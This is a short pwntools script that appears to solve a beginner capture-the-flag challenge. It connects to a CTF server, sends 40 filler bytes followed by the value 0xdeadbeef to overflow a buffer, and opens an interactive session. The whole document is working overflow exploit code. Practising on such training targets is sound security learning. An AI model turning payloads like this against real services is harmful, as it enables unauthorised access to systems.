from pwn import *

p=remote("ctf.j0n9hyun.xyz",3000)

payload='A'*40+p32(0xdeadbeef)

p.sendline(payload)
p.interactive()

